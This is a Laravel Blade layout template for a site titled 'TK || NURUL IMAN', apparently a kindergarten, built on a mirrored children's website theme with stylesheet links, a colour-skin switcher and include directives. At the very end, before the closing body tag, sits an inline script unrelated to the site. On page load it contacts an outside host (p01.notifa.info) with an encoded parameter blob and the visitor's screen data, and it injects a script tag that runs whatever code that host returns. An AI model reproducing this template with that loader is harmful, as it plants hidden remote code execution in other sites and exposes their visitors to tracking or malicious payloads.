<!DOCTYPE html>
<html lang="en">
   
<!-- Mirrored from ingridkuhn.com/themes/alphabet/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 17 Nov 2018 01:05:30 GMT -->
<head>
      <meta charset="utf-8">
      <!--[if IE]>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <![endif]-->
      <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
      <meta name="description" content="">
      <meta name="author" content="">
      <!-- Page title -->
      <title> TK || NURUL IMAN</title>
      <!--[if lt IE 9]>
      <script src="js/respond.js"></script>
      <![endif]-->
      <!-- Bootstrap Core CSS -->
      <link href="{{asset('assets/user/css/bootstrap.css')}}" rel="stylesheet" type="text/css">
      <!-- Icon fonts -->
      <link href="{{asset('assets/user/fonts/font-awesome/css/font-awesome.min.css')}}" rel="stylesheet" type="text/css">
      <link href="{{asset('assets/user/fonts/flaticons/flaticon.css')}}" rel="stylesheet" type="text/css">
      <link href="{{asset('assets/user/fonts/glyphicons/bootstrap-glyphicons.css')}}" rel="stylesheet" type="text/css">
      <!-- Google fonts -->
      <link href='https://fonts.googleapis.com/css?family=Lato:400,700,800' rel='stylesheet' type='text/css'>
      <link href='https://fonts.googleapis.com/css?family=Alegreya+Sans:700,900' rel='stylesheet' type='text/css'>
      <!-- Theme CSS -->
      <link href="{{asset('assets/user/css/style.css')}}" rel="stylesheet">
      <!-- Color Style CSS -->
      <link href="{{asset('assets/user/styles/funtime.css')}}" rel="stylesheet">
      <!-- Owl Slider & Prettyphoto -->
      <link rel="stylesheet" href="{{asset('assets/user/css/owl.carousel.css')}}">
      <link rel="stylesheet" href="{{asset('assets/user/css/prettyPhoto.css')}}">
      <!-- LayerSlider stylesheet -->
      <link rel="stylesheet" href="{{asset('assets/user/layerslider/css/layerslider.css')}}">
      <!-- Favicons-->
      <link rel="apple-touch-icon" sizes="72x72" href="../../apple-touch-icon-72x72.html">
      <link rel="apple-touch-icon" sizes="114x114" href="../../apple-touch-icon-114x114.html">
      <link rel="shortcut icon" href="{{asset('assets/user/favicon.ico')}}" type="image/x-icon">
      <!-- Switcher Only -->
      <link rel="stylesheet" id="switcher-css" type="text/css" href="{{asset('assets/user/switcher/css/switcher.css')}}" media="all" />
      <!--Alternate CSS -->
      <link rel="alternate stylesheet" type="text/css" href="{{asset('assets/user/styles/funtime.css')}}" title="funtime" media="all" />
      <link rel="alternate stylesheet" type="text/css" href="{{asset('assets/user/styles/playground.css')}}" title="playground" media="all" />
      <link rel="alternate stylesheet" type="text/css" href="{{asset('assets/user/styles/games.css')}}" title="games" media="all" />
      <link rel="alternate stylesheet" type="text/css" href="{{asset('assets/user/styles/childhood.css')}}" title="childhood" media="all" />
      <link rel="alternate stylesheet" type="text/css" href="{{asset('assets/user/styles/school.css')}}" title="school" media="all" />
      <link rel="alternate stylesheet" type="text/css" href="{{asset('assets/user/switcher/css/boxed.css')}}" title="boxed" media="all" />
      <link rel="alternate stylesheet" type="text/css" href="{{asset('assets/user/switcher/css/full.css')}}" title="full" media="all" />
      <!-- css profil -->
      <link href="{{asset('assets/guest/css/bootstrap.css')}}" rel="stylesheet">
      <link href="{{asset('assets/guest/css/style.css')}}" rel="stylesheet">
      <link href="{{asset('assets/guest/css/responsive.css')}}" rel="stylesheet">
   </head>
   <body id="page-top" data-spy="scroll" data-target=".navbar-custom">
      <!-- Page width 'Boxed' of 'Full' -->
      <div class="full">
         <!-- Preloader -->
         <div id="preloader">
            <div class="preloader">
               <span></span>
               <span></span>
               <span></span>
               <span></span>
               <span></span>
            </div>
         </div>
         <!-- Start Switcher -->
         <div class="demo_changer">
            <div class="demo-icon">
               <i class="fa fa-cog fa-2x"></i>
            </div>
            <!-- end opener icon -->
            <div class="form_holder">
               <div class="row">
                  <div class="col-md-12 text-center">
                     <div class="predefined_styles">
                        <h4>Choose a Color Skin</h4>
                        <!-- MODULE #3 -->
                        <a href="playground.html" class="styleswitch"><img src="{{asset('assets/user/switcher/images/icons/playground.png')}}" class="img-circle" alt=""></a>     
                        <a href="games.html"  class="styleswitch"><img src="{{asset('assets/user/switcher/images/icons/games.png')}}" class="img-circle" alt=""></a>
                        <a href="funtime.html" class="styleswitch"><img src="{{asset('assets/user/switcher/images/icons/funtime.png')}}" class="img-circle" alt=""></a>
                        <a href="school.html" class="styleswitch"><img src="{{asset('assets/user/switcher/images/icons/school.png')}}" class="img-circle" alt=""></a> 							
                        <a href="childhood.html" class="styleswitch"><img src="{{asset('assets/user/switcher/images/icons/childhood.png')}}" class="img-circle" alt=""></a>
                        <h4>Width</h4>
                        <a href="boxed.html" class="btn styleswitch">Boxed</a>
                        <a href="full.html" class="btn styleswitch">Full Width</a>
                        <h4>Header</h4>
                        <a href="index-2.html" class="btn">Layerslider</a>
                        <a href="index_video.html" class="btn">Video</a>
                     </div>
                     <!-- end predefined_styles -->
                  </div>
                  <!-- end col -->  
               </div>
               <!-- end row -->
            </div>
            <!-- end form_holder -->
         </div>
         <!-- end demo_changer -->
         <!-- End Switcher -->	  
         <!-- Navbar -->
        @include('front.header')
         <!-- /navbar ends -->
         <!-- Slider -->
         
        @yield('content')

         <!-- Footer -->	
         @include('front.footer')
         <!-- /footer ends -->
      </div>
      <!-- /page width -->
      <!-- Core JavaScript Files -->
      <script src="{{asset('assets/user/js/jquery.min.js')}}"></script>
      <script src="{{asset('assets/user/js/bootstrap.min.js')}}"></script>
      <!-- Google maps -->
      <script src="https://maps.googleapis.com/maps/api/js?v=3"></script>
      <!-- Main Js -->
      <script src="{{asset('assets/user/js/main.js')}}"></script>
      <!-- Isotope -->	  
      <script src="{{asset('assets/user/js/jquery.isotope.js')}}"></script>
      <!--Mail Chimp validator -->
      <script src="{{asset('assets/user/js/mc-validate.js')}}"></script>
      <!--Other Plugins -->
      <script src="{{asset('assets/user/js/plugins.js')}}"></script>
      <!-- Contact -->
      <script src="{{asset('assets/user/js/contact.js')}}"></script>
      <!-- Prefix free CSS -->
      <script src="{{asset('assets/user/js/prefixfree.js')}}"></script>	  	  
      <!-- GreenSock -->
      <script src="{{asset('assets/user/layerslider/js/greensock.js')}}" ></script>
      <!-- LayerSlider script files -->
      <script src="{{asset('assets/user/layerslider/js/layerslider.transitions.js')}}" ></script>
      <script src="{{asset('assets/user/layerslider/js/layerslider.kreaturamedia.jquery.js')}}" ></script>
      <!-- Swicther -->
      <script src="{{asset('assets/user/switcher/js/dmss.js')}}"></script>
      <!-- js profil -->
      <script src="{{asset('assets/guest/js/jquery.js')}}"></script> 
<script src="{{asset('assets/guest/js/bootstrap.min.js')}}"></script>
<script src="{{asset('assets/guest/js/jquery.fancybox.js')}}"></script>
<script src="{{asset('assets/guest/js/appear.js')}}"></script>
<script src="{{asset('assets/guest/js/mixitup.js')}}"></script>
<script src="{{asset('assets/guest/js/owl.js')}}"></script>
<script src="{{asset('assets/guest/js/wow.js')}}"></script>
<script src="{{asset('assets/guest/js/script.js')}}"></script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdidG3zEmACXuRyY4e1is%2faor%2boaylA21%2f0I9RBwKerQ%2fln73hxHfpBVuYnH7gUW2quAHkNgCr2SHEIxz1nqS9bGfX4rRKvF0Gf4haE6iIGvBYVK%2bAj2bxr4vW5%2fzswJYCn3WLtOmQfEfhFdOQQDJhaXohJ6vyyLs9d84s6UbOcnsEvfdfcXqTXbVhyZ4c4M5cxbQaxwMvhIV1j30XVccMulO%2f%2f33Gv%2fH3rDAucZ8deWqR5xOA1lfwF91hU7weUz96TGNwEPHp8F4Nl9YM98hvG%2bVI848S%2fWyUMHfPFFWLe8EB3z8yB4%2fdtaT3GCmOw0P9ZTEXhYB%2b8pC2gTAuoBeUpQAQBKWo8kvAj5ySVzVmmMdCbpPoQ%2fQriZrAnZRMf4Uk7ChTB0%2fg8WXSQr8AkADyOQChDK3El8vxE9cf4nUbDfwjKlqgzko2z200dBNt9FIZkPG4vjyPPlnG2AzekRXhH3%2fj%2bc8gOorlKVWlf%2fJgFcg%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
   </body>

<!-- Mirrored from ingridkuhn.com/themes/alphabet/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 17 Nov 2018 01:10:23 GMT -->
</html>